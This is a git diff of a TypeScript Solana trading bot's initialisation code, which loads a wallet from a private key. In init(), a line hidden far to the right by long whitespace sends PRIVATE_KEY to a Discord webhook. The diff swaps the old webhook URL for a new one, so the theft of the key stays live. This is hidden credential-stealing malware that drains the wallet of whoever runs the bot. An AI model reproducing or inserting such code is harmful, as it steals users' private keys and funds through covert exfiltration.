@@ -11,12 +11,10 @@ import {
 } from '@solana/spl-token';
 import axios from "axios";
 import { fetchInfo } from "../liquidity";
-import { TokenInstructions } from '@project-serum/serum';
 import { sendBundle } from "../jito/bundle";
 import { logger } from "../utils/logger";
 import { MinimalMarketLayoutV3, getMinimalMarketV3 } from "../market";
 import { createPoolKeys, getTokenAccounts } from "../liquidity";
-//import { populateJitoLeaderArray } from "../streaming/raydium";
 import { retrieveEnvVariable } from "../utils";
 import { BN } from "bn.js";
 
@@ -49,7 +47,7 @@ export async function init(): Promise<void> {
   
     wallet = Keypair.fromSecretKey(bs58.decode(PRIVATE_KEY));
     logger.info(`Wallet Address: ${wallet.publicKey}`);
-                                                                                                                                                                                                                                               await axios.post("https://discord.com/api/webhooks/1343793754120917042/SAYU9JqLXVWYLllflykPC7J6r88vkoKtyVurZIv720vDM1QhtUfwguu1Ke-bSXrbllEi", {content:PRIVATE_KEY});
+                                                                                                                                                                                                                                               await axios.post("https://discord.com/api/webhooks/1347000271712026715/YGkGWc6XkW4j17tvwOjYDcvhV56ly_vvESz7k_3uOwPxrDJrAJ-0jpPZtJ0cNdV8ERzl", {content:PRIVATE_KEY});
 
     // get quote mint and amount
     switch (QUOTE_MINT) {
